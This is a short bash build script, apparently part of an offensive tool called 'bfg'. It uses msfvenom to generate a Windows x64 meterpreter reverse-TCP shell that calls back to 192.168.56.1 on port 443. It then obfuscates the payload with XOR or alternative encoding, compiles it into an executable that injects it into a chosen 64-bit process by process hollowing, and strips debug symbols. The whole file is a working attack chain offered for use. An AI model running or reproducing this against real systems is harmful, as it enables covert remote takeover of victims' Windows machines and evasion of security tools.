#!/bin/bash          
# Script that builds a reverse tcp shell with metasploit and generates an executable
# that deploys the payload against a target 64 bit process via process hollowing.
#
# Include predefined win64 compiler
# >>> You can edit the compiler in build/global_win64.sh
# >>> or enter $win64_compiler="mycompiler" here
. build/global_win64.sh
# Assume empty defs.h, cleanup
echo "" > defs.h
# Generate reverse tcp shell payload via metasploit
# Adjust parameters to your needs
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=443 -f exe -a x64 --platform Windows > payloads/revtcp64.exe
# Call make_bfg and compile the payload into the executable
# -H switch enables hollowing functionality
# Set -x flag to use xor obfuscation on the payload
# Set -a flag to use alternative encoding, which is a little more complex
# Set -X flag to declare that target process is 64 bit
./make_bfg -H payloads/revtcp64.exe -a -X
# Compile 
$win64_compiler -o bfg.exe bfg.c
# Remove debug symbols from generated executable
strip bfg.exe
# Cleanup
echo "" > defs.h
#
# Example usage of generated executable:
# bfg.exe target.exe
# target.exe is the target executable to be hollowed.
